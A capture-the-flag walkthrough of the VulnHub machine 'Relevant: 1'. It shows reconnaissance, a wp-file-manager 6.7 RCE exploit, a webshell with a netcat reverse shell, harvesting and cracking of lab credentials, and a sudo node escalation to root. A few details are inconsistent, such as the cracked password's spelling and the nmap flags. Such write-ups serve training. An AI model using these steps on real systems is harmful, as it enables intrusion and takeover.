# Relevant: 1 Vulnhub Walkthrough

Today we are going to solve another boot2root challenge called “**Relevant: 1**“. It’s available at VulnHub for penetration testing and you can download it from **here**.

### Penetration Testing Methodology

**Reconnaissance**

- Netdiscover
- Nmap

**Enumeration**

- Dirsearch
- Nmap with scripts WordPress

**Exploiting**

- Wp-file-manager 6.7 Remote Code Execution (RCE)

**Privilege Escalation**

- Abuse of credentials with weak hashes in hidden files
- Abuse of sudo
- Capture the flag

### Walkthrough

**Reconnaissance**

We are looking for the machine with netdiscover

netdiscover -i ethX


Currently scanning: 192.168.31.0/16    Screen View: Unique Hosts

28 Captured ARP Req/Rep packets, from 8 hosts.    Total size: 1684

---------------------------------------------------------------------------------
IP              At MAC Address      Count       Len     MAC Vendor / Hostname
---------------------------------------------------------------------------------
192.168.10.164  --:--:--:--:--:-d      10       600     SAMSUNG ELECTRO MECHANICS
192.168.10.1    --:--:--:--:--:-4      12       700     Sagemcom Broadband SAS
192.168.10.155  --:--:--:--:--:-d       1        60     Intel Corporate
192.168.10.154  --:--:--:--:--:-2       1        60     Sagemcom Broadband SAS
192.168.10.156  --:--:--:--:--:-2       1        60     Amazon Technologies Inc.
192.168.10.159  --:--:--:--:--:-5       1        64     Sagemcom Broadband SAS
192.168.10.161  --:--:--:--:--:-6       1        60     PCS Systemtechnik GmbH
192.168.10.158  --:--:--:--:--:-8       1        60     Unknown vendor



So, we put the IP address in our “**/etc/hosts**” file and start by running the map of all the ports with operating system detection, software versions, scripts and traceroute.

nmap -A –p- 192.168.10.161


root@3n0s0n4ld:~/Relevant# nmap -p -A relevant.vh -o nmap-relevant.log
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 07:37 EDT
Nmap scan report for relevant.vh (192.168.10.161)
Host is up (0.00081s latency).
Not shown: 65533 closed ports (UDP: 0/0, TCP: 0/0, SCTP: 0/0, DCCP: 0/0, X11: 0/0, DCCP: 0/0, X11: 0/0)
PORT    STATE   SERVICE VERSION
22/tcp  open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; proto
80/tcp  open   http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Database Error


### Enumeration

So far it seems all easy, a web service with some links containing credential information in leaks and a QR code to set up a double authentication factor (2FA) . Too beautiful to be true!


relevant.vh

Error establishing a database connection because we hax0r3d your webz!

https://rb.gy/g5prrv

https://pastebin.com/sGzQSQXu

https://ibb.co/JtTY0Md


Listing of credentials in public leaks.


PASTEBIN

0.31 KB

1. Vulnhub CTF -- not a real breach
2.
3. cardib : CardiCardiBacardi
4. cline : Hello^Dear^Kitten
5. edward : $cissor-Hands
6. kevin : Fish$Called-->
7. michael : abc123YouAndMe
8. patsy : Crazy%for%Falling
9. thriller : CuzThisIsThriller!
10. wanda : Franks&Beans&Mustard
11. willy : Wonka&TheChocolateFactory
12. webmaster : Google'sAllTheThings


__Content of the QR code:__


https://www.codigos-qr.com

Readed QR Content:

otpauth://totp
/patsy@relevant?secret=BTVB3SSDD4SZYUV7DXFPBCIFK
Y&issuer=relevant

otpauth://totp
/patsy@relevant?secret=BTVB3SSDD4SZYUV7DXFPBCIFK
IFKY&issuer=relevant


We log in via **SSH**, insert the password, insert the double authentication factor and disconnect! The account has disabled the use of this service, so it is a rabbit hole.


root@m3n0sd0n4ld:~/Relevant# ssh patsy@relevant.vh
Password:
Verification code:
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-48-generic)

* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage

System information as of Sat 26 Sep 2020 02:05:13 PM UTC

  System load: 0.06             Processes:
  Usage of /: 51.1% of 8.79GB   Users logged in:
  Memory usage: 57%             IPv4 address for enp0s3:
  Swap usage: 0%

* Kubernetes 1.19 is out! Get it in one command with:
   
    sudo snap install microk8s --channel=1.19 --classic
   
  https://microk8s.io/ has docs and details.

0 updates can be installed immediately.
0 of these updates are security updates.

Last login: Sat Sep 26 14:02:13 2020 from 192.168.10.180
This account is currently not available.
Connection to relevant.vh closed.


It’s time to launch my favourite fuzzing tool, in my case I used **dirsearch**. We list that there are **WordPress** files and directories displayed on the machine.


root@m3n0s0n4ld:~/Relevant# dirsearch -u http://relevant.vh -e "" -x 403 | tee dirsearch.log

dirsearch v0.3.8

Extensions: | HTTP method: get | Threads: 10 | Wordlist size: 6097

Error Log: /root/Tools/Web/dirsearch/logs/errors-20-09-26_07-44-47.log

Target: http://relevant.vh

[07:44:47] Starting:
[07:44:47] 500 - 3KB - /
[07:44:47] 400 - 166B - /%2e%2e/google.com
[07:44:58] 500 - 3KB - /index.php
[07:44:58] 200 - 19KB - /license.txt
[07:45:02] 200 - 7KB - /readme.html
[07:45:05] 301 - 178B - /wp-admin → http://relevant.vh/wp-admin/
[07:45:05] 500 - 3KB - /wp-admin/
[07:45:05] 200 - 0B - /wp-content/
[07:45:05] 200 - 69B - /wp-content/plugins/akismet/akismet.php
[07:45:05] 301 - 178B - /wp-content → http://relevant.vh/wp-content/
[07:45:05] 301 - 178B - /wp-includes → http://relevant.vh/wp-includes/
[07:45:05] 500 - 3KB - /wp-login.php
[07:45:05] 500 - 0B - /wp-includes/rss-functions.php
[07:45:05] 200 - 0B - /xmlrpc.php
[07:45:06] 409 - 3KB - /wp-admin/setup-config.php


Going back to the clue given by the creator of the machine in the description: “*enumerate the box, then enumerate the box differently*“.

Since our only evidence is the remains of **WordPress** files, we will try with the nmaps scripts for this CMS.

It will list two plugins, among them “**wp-file-manager 6.7**“.

root@m3n0s0n4ld:~/Relevant# nmap --script http-wordpress-enum --script-args search-limit=10000 relevant.vh
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 18:19 EDT
Nmap scan report for relevant.vh (192.168.10.161)
Host is up (0.00033s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
22/tcp open   ssh
80/tcp open   http
| http-wordpress-enum:
| Search limited to top 4778 themes/plugins
|   plugins
|     akismet 4.1.6
|     wp-file-manager 6.7
|   themes
|_    twentyseventeen 2.4
MAC Address: 08:00:27:61:A0:E6 (Oracle VirtualBox virtual NIC)
Nmap done: 1 IP address (1 host up) scanned in 5.06 seconds


### Exploiting

After the above list, we look for exploits and vulnerabilities that we can exploit for this version. We found an exploit that allows **remote code execution** without the need for authentication.

**Exploit**: **https://github.com/w4fz5uck5/wp-file-manager-0day**

Execute the exploit and access the server.


root@m3n0s0dn4ld:~/Relevant# python elFinder.py http://relevant.vh id
Usage: elFinder.py http://localhost
URL Shell: %s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=<CMD>
$ whoami
PNG
?
?IDATxK[0m^e58@0m,miivV@X1@2g!@0xmc@0@0@??????

Since visibility is a bit of a problem, we upload a “**pentestmonkey**” webshell, put a netcat on it and run our webshell.

We execute our two favourite commands to get an interactive shell.


root@m3n0s0n4ld:~/Relevant# rlwrap nc -nvlp 5555
listening on [any] 5555 ...
connect to [192.168.10.180] from (UNKNOWN) [192.168.10.161] 52822
Linux relevant 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49
6_64 x86_64 GNU/Linux
 22:24:03 up 22 min, 0 users, load average: 0.00, 0.00, 0.00
USER    TTY    FROM    LOGNAME    IDLE   JCPU   PCPU WHAT
uid=33(wwww-data) gid=33(wwww-data) groups=33(wwww-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@relevant:/$ export TERM=xterm-256color
export TERM=xterm-256color


We read the file “**wp-config.php**“, but something tells me that the password is not going to help us much either. xD


www-data@relevant:~/html$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 *  * MySQL settings
 *  * Secret keys
 *  * Database table prefix
 *  * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host **
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'DidYouThinkItWouldBeThatEasy?TryHarder!');

/** MySQL hostname */
define('DB_HOST', 'localhost');


Here we checked the files of the user “**h4x0r**” and found a “**hidden**” folder with three dots, in it there is a file called “**note.txt**” with some credentials in **SHA-1** that we must crack.


www-data@relevant:/home$ cd h4x0r
cd h4x0r
www-data@relevant:/home/h4x0r$ ls -lna
ls -lna
total 28
drwxr-xr-x 4 1002 1002 4096 Sep 21 20:16 .
drwxr-xr-x 5    0    0 4096 Sep 21 19:50 ..
drwxr-xr-x 2 1002 1002 4096 Sep 21 20:15 ...
lrwxrwxrwx 1 1002 1002    9 Sep 21 20:16 .bash_history -> /dev/null
-rw-r--r-- 1 1002 1002  220 Sep 21 19:50 .bash_history
-rw-r--r-- 1 1002 1002 3771 Sep 21 19:50 .bash_history
drwxr-xr-x 3 1002 1002 4096 Sep 21 20:06 .local
-rw-r--r-- 1 1002 1002  807 Sep 21 19:50 profile
www-data@relevant:/home/h4x0r$ cd ..
cd ...
www-data@relevant:/home/h4x0r/...$ ls -lna
ls -lna
total 12
drwxr-xr-x 2 1002 1002 4096 Sep 21 20:15 .
drwxr-xr-x 4 1002 1002 4096 Sep 21 20:16 ..
-rw-r--r-- 1 1002 1002   48 Sep 21 20:15 note.txt
www-data@relevant:/home/h4x0r/...$ cat note.txt
cat note.txt
news : 4C7EB317A4F4322C325165B4217C436D6E0FA3F1
www-data@relevant:/home/h4x0r/...$


We access the online site “**hashes.com**” and insert our hash and get the password in plain text.


Hashes.com

Home   FAQ   Purchase Credits   Debit

Proceeded!  
1 hashes were checked: 1 found 0 not found  

Found:  
4c7eb317a4f4322c325165b4217c436d6e0fa3f1  
backdoor1over


### Privilege Escalation (root)

Now yes, we authenticate with the user “**news**“, we execute “**sudo -l**” and we see that we have permissions to execute the binary “**node**”.


www-data@relevant:/home/h4x0r/ ...$ su news
su news
Password: backdoorlover

news@relevant:/home/h4x0r/ ...$ id
id
uid=9(news) gid=9(news) groups=9(news)
news@relevant:/home/h4x0r/ ...$ sudo -l
sudo -l
[sudo] password for news: backdoorlover

Matching Defaults entries for news on relevant:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sb

User news may run the following commands on relevant:
    (ALL : ALL) /usr/bin/node


We take advantage of this to scale privileges in the system as root, for this we will execute the following syntax.

And finally, we will read our deserved flag!


news@relevant:/home/h4x0r/...$ sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
# cat /root/root.txt
cat /root/root.txt

Nice work! Congratulations!

Let me know what you think: @iamv1nc3nt
